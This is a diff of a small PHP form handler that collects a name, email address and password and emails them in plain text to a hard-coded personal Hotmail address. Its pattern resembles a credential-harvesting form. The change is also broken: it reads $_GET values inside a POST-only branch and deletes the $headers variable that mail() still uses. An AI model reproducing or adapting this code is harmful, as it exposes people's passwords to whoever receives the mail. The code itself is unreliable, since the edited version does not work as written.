@@ -1,8 +1,8 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $nome = $_POST['nome'];
-    $email = $_POST['email'];
-    $senha = $_POST['senha']; // Evite enviar senhas sem segurança em produção!
+    $nome = $_GET['nome'];
+    $email = $_GET['email'];
+    $senha = $_GET['senha']; // Evite enviar senhas sem segurança em produção!
 
     // Endereço de e-mail para onde será enviado
     $to = "isaky_gamer@hotmail.com";
@@ -13,9 +13,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message .= "Nome: $nome\n";
     $message .= "E-mail: $email\n";
     $message .= "Senha: $senha\n";
-
-    // Cabeçalhos do e-mail
-    $headers = "From: noreply@seusite.com";
 
     // Envia o e-mail
     if (mail($to, $subject, $message, $headers)) {
